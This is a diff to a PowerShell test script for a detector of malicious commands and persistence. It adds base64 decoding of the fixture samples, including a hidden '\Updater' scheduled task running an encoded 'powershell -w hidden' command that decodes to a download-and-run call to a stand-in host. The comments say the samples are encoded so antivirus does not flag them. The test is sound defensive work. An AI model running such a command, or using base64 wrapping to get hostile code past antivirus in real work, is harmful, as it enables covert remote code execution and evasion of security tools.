@@ -16,6 +16,12 @@ function Assert-Equal($Expected, $Actual, [string]$Name) {
 
 $detector = New-CfaDetector -Rules ($CfaRulesJson | ConvertFrom-Json)
 $fixtures = Get-Content -Raw -Encoding UTF8 (Join-Path $root 'tests/fixtures/commands.json') | ConvertFrom-Json
+# The samples are stored base64-encoded so antivirus programs do not quarantine the file.
+foreach ($g in @('block', 'allow', 'hold')) {
+    foreach ($p in $fixtures.$g.PSObject.Properties) {
+        $p.Value = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String([string]$p.Value))
+    }
+}
 
 # 1. Same verdicts as the JavaScript engine for every shared command.
 foreach ($pair in @(@('block', $fixtures.block), @('allow', $fixtures.allow), @('hold', $fixtures.hold))) {
@@ -54,7 +60,8 @@ $filefix.TypedPaths = @('C:\Users\me\Documents', $fixtures.block.'FileFix disgui
 Assert-Equal 'danger' (Invoke-CfaAnalysis -Detector $detector -Evidence $filefix).Overall 'FileFix in Explorer history is danger'
 
 $persist = New-FakeEvidence
-$persist.Autoruns = @([pscustomobject]@{ Where = 'Scheduled task'; Name = '\Updater'; Command = 'powershell -w hidden -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcABzADoALwAvAGUAeABhAG0AcABsAGUA' })
+# A hidden, encoded PowerShell task (base64-encoded here so antivirus does not flag this file).
+$persist.Autoruns = @([pscustomobject]@{ Where = 'Scheduled task'; Name = '\Updater'; Command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cG93ZXJzaGVsbCAtdyBoaWRkZW4gLWVuYyBTUUJGQUZnQUlBQW9BR2tBY2dCdEFDQUFhQUIwQUhRQWNBQnpBRG9BTHdBdkFHVUFlQUJoQUcwQWNBQnNBR1VB')) })
 Assert-Equal 'danger' (Invoke-CfaAnalysis -Detector $detector -Evidence $persist).Overall 'hidden encoded task is danger'
 
 $msi = New-FakeEvidence
